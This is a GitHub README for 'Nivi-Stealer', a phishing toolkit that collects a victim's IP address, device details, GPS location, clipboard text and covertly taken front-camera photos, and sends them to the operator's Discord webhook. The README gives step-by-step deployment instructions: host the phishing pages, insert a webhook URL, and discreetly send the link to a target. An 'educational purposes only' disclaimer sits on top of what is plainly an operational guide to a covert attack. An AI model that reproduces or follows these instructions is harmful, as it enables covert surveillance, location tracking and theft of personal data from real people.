# Nivi-Stealer - An Advanced Data Extraction Toolkit

![Nivi-Stealer Logo](https://media.tenor.com/CgGUXc-LDc4AAAAC/hacker-pc.gif)

Welcome to Nivi-Stealer, a collaborative project developed by Tanmay, aimed at enhancing your understanding of data security and privacy vulnerabilities. This versatile toolkit is designed exclusively for educational purposes. We encourage responsible and ethical use. This README provides an in-depth overview of Nivi-Stealer's powerful features and advanced usage.

## Features

Nivi-Stealer brings a range of advanced features to the table, empowering users with extensive capabilities:

- **Data Collection:**
  - Extract Victim's IP Address
  - Gather Comprehensive Device Information
  - Capture Network and Battery Details
  - Utilize Device GPS for Precise Location Retrieval
  - Secretly Capture Images from the Front Camera
  - Retrieve Text from the Victim's Clipboard (recently added)

- **Data Handling:**
  - Send Collected Logs to Discord in Real-Time
  - Save Logs Locally in a Secure Text File

- **Cross-Platform:**
  - Compatible with Android, Windows, Linux, and macOS
  - Uses iframes to Load Live Websites for Reliable Phishing Attacks

## How to Use

### Method 0: Cloud-Based Execution with repl.it

[![Run on Repl.it](https://repl.it/badge/github/swagkarna/Nivistealer)](https://repl.it/github/swagkarna/Nivistealer)

- Click the button above or [this link](https://repl.it/github/swagkarna/Nivistealer) to execute Nivi-Stealer on repl.it.
- Login or sign up on [repl.it](https://repl.it).
- After cloning the repository, customize the tool by editing [this line](https://github.com/swagkarna/Nivistealer/blob/bfb77519443a90613fab8f55c1a534b8918c5345/python_flask/index.html#L185) with your repl URL.
- Initiate the tool by clicking "Run."

### Method 1: Host Your Own Phishing Site

- Clone or download this repository.
- Register an account on a web hosting platform offering SSL support (e.g., [000webhost.com](https://www.000webhost.com/)).
- Upload `index.html`, `sunni.php`, and `post.php` to your web hosting server.
- Secure your logs by replacing [this link](https://github.com/swagkarna/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/index.html#L80) with your Discord webhook URL in `index.html`.
- Discreetly distribute the phishing link to your target. Captured data will be sent to your Discord webhook and saved to `sensitiveinfo.txt`.

### Method 2: Local Execution

- Clone the repository and navigate to the `python_flask` directory.
- Install the necessary Python packages in your terminal with these commands:
 pip3 install colorama
 pip3 install flask
- Customize the tool by editing [this line](https://github.com/swagkarna/Nivistealer/blob/cd447284a17844d019fa116f2cd5665de9bd1c6b/python_flask/index.html#L142) with your URL.
- Execute Nivi-Stealer with the command:
 python nivistealer.py
- Captured images and logs will be stored locally in your directory.

## Nivi-Stealer in Action

Witness Nivi-Stealer in action using Method 2: [Video Link](https://user-images.githubusercontent.com/46685308/156226849-ccce8ade-552a-49bd-be93-eb14aaed8971.mp4)

## Legal Disclaimer

This tool is intended for educational purposes only. We emphasize the importance of using it responsibly and ethically. The developer takes no responsibility for any illegal activities. Always use it in compliance with applicable laws and ethical standards.

## Supporters

Show your support by giving a star to this repository:

[![Stargazers repo roster for @tanm-sys/Nivistealer](https://reporoster.com/stars/tanm-sys/Nivistealer)](https://github.com/tanm-sys/Nivistealer/stargazers)

[![Forkers repo roster for @tanm-sys/Nivistealer](https://reporoster.com/forks/tanm-sys/Nivistealer)](https://github.com/tanm-sys/Nivistealer/network/members)
